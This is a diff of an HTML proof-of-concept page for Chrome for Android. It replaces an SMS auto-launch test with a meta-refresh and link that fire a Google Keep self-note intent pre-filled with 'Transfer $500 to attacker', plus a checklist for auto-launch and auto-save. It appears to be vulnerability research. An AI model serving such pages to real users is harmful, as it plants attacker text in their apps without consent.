@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Android Chrome SMS Auto Launch PoC</title>
-
-  <!-- Auto-redirect on page load -->
-  <meta http-equiv="refresh"
-        content="0;url=sms:15551234567?body=Security%20Alert">
-
+    <title>Google Keep Intent Test</title>
+    <meta http-equiv="refresh" content="1; url=intent:#Intent;action=com.google.android.voicesearch.SELF_NOTE;S.android.intent.extra.TEXT=Reminder:%20Transfer%20$500%20to%20attacker;package=com.google.android.keep;end">
 </head>
 <body>
-  <h1>SMS Auto Launch PoC</h1>
-  <p>
-    If the Messages app opens automatically with a pre-filled SMS body
-    <strong>without any user interaction</strong>,
-    this confirms a Chrome for Android vulnerability.
-  </p>
+    <h1>Google Keep Auto-Launch PoC</h1>
+    <p>If the app does not open automatically in 1 second, click the link below:</p>
+    
+    <a href="intent:#Intent;action=com.google.android.voicesearch.SELF_NOTE;S.android.intent.extra.TEXT=Reminder:%20Transfer%20$500%20to%20attacker;package=com.google.android.keep;end">
+        Manually Trigger Self-Note Intent
+    </a>
+
+    <hr>
+    <h3>Vulnerability Checklist:</h3>
+    <ul>
+        <li><b>Auto-Launch:</b> Does Google Keep open without you clicking anything?</li>
+        <li><b>Pre-fill:</b> Is the "Transfer $500" text visible in the note?</li>
+        <li><b>Auto-Save:</b> Does the note save <i>without</i> you tapping a save button? (If yes, this is a Critical bug).</li>
+    </ul>
 </body>
 </html>
